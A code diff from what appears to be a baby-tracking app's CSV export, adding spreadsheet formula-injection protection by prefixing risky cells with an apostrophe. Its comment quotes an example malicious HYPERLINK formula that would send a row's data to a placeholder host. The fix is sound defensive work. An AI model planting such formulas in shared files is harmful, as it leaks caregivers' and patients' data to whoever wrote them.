@@ -158,11 +158,33 @@ String buildCsv(ExportData data) {
   return buffer.toString();
 }
 
-/// Quotes a CSV field when it contains a comma, quote, or newline, doubling
-/// any embedded quotes (RFC 4180).
+/// Characters that make a spreadsheet read a cell as an expression rather
+/// than as text. Tab and carriage return are in the set because Excel trims
+/// leading whitespace before it decides, so a tab in front of `=1+1` buys
+/// nothing.
+final _formulaStart = RegExp(r'^[=+\-@\t\r]');
+
+/// Escapes one cell on its way into the sheet. Two separate jobs:
+///
+/// * RFC 4180 quoting, so a comma, quote, or newline inside a value cannot
+///   shear the row apart.
+/// * Defusing formulas. Excel, Numbers and Sheets all evaluate a cell that
+///   opens with `=`, `+`, `-` or `@`. Notes and medicine names are free text
+///   that any caregiver on the baby can write, and this file exists to be
+///   handed to a pediatrician who opens it in exactly those programs — so a
+///   note of `=HYPERLINK("http://example.invalid?"&A1,"Results")` would
+///   reach them as a live link that reports the row back to whoever wrote
+///   it. The leading apostrophe is the format's own "this is text" marker.
+///   Some Excel builds show it rather than consuming it, which is a fair
+///   price for a note that was trying to be a formula.
+///
+/// No column the sheet generates starts with one of those characters — dates
+/// and times do not, and every amount it writes is non-negative — so this
+/// only ever fires on free text.
 String escapeCsv(String value) {
-  if (!value.contains(RegExp('[",\n\r]'))) return value;
-  return '"${value.replaceAll('"', '""')}"';
+  final text = value.startsWith(_formulaStart) ? "'$value" : value;
+  if (!text.contains(RegExp('[",\n\r]'))) return text;
+  return '"${text.replaceAll('"', '""')}"';
 }
 
 String _date(DateTime d) =>
